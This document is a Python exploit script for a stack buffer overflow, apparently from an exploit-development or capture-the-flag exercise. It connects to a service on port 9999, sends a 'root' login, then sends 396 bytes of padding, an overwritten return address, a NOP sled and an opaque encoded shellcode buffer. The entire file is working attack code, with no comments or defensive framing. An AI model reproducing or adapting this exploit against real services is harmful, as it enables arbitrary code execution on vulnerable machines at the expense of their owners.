import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

offset = 396
eip = b"\x10\xcf\xff\xff"
nop = b"\x90" * 16

buf =  b""
buf += b"\xda\xda\xbb\xea\xf4\x6e\xc1\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x12\x83\xe8\xfc\x31\x58\x13\x03\xb2"
buf += b"\xe7\x8c\x34\x73\xd3\xa6\x54\x20\xa0\x1b\xf1\xc4"
buf += b"\xaf\x7d\xb5\xae\x62\xfd\x25\x77\xcd\xc1\x84\x07"
buf += b"\x64\x47\xee\x6f\x08\xb7\x10\x6e\x9e\xb5\x10\x61"
buf += b"\x02\x33\xf1\x31\xdc\x13\xa3\x62\x92\x97\xca\x65"
buf += b"\x19\x17\x9e\x0d\xcc\x37\x6c\xa5\x78\x67\xbd\x57"
buf += b"\x10\xfe\x22\xc5\xb1\x89\x44\x59\x3e\x47\x06"

payload = (b"A" * offset + eip + nop + buf)

print("Exploit ... ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.recv(1024)
    
s.send(b'root\r\n')
s.recv(1024)
s.sendall(payload + b'\r\n')
s.send(b'QUIT\r\n')
s.close()

